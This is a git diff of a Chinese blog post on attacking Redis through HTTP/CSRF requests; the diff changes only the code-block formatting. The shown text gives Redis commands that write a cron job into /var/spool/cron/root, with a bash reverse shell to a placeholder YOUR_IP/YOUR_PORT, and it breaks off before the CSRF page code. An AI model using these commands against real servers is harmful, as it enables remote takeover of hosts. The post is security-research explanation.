@@ -21,8 +21,10 @@ share: true
 
 但是根据作者项目中js脚本的payload，发现无法在实际环境中执行，究其根本原因，还在于空格字符的干扰。虽然作者提供的示例无法直接拿来使用，不过还是暗中给出了解决该问题的链接地址：
 
-{% highlight %}
+{% highlight javascript %}
+
 http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html
+
 {% endhighlight %}
 
 这里不得不膜拜一下，人家早在2014年就开始玩HTTP报文攻击redis服务了。文章里提到了构造满足Redis Protocol格式的命令来避免空格的干扰，还提到了读取系统文件内容等利用方式。
@@ -33,28 +35,36 @@ http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_reque
 
 在本地搭建的测试环境中，我们尝试利用Redis CSRF写入cron配置脚本，从而获取目标主机的反弹shell。从redis原始操作命令来看，需要4步程序：
 
-1. 设置路径:
+设置路径:
 
-{% highlight %}
+{% highlight javascript %}
+
 config set dir /var/spool/cron/
+
 {% endhighlight %}
 
-2. 设置文件名：
+设置文件名：
 
-{% highlight %}
- config set dbfilename root
+{% highlight javascript %}
+
+config set dbfilename root
+
 {% endhighlight %}
 
-3. 将cron脚本写入key:
+将cron脚本写入key:
 
-{% highlight %}
+{% highlight javascript %}
+
 set wow "\n\n\n* * * * * bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\n\n\n"
+
 {% endhighlight %}
 
-4. 利用save命令写入系统目录:
+利用save命令写入系统目录:
 
-{% highlight %}
+{% highlight javascript %}
+
 SAVE
+
 {% endhighlight %}
 
 将这些命令编码，并构造成CSRF攻击页面，具体代码如下：
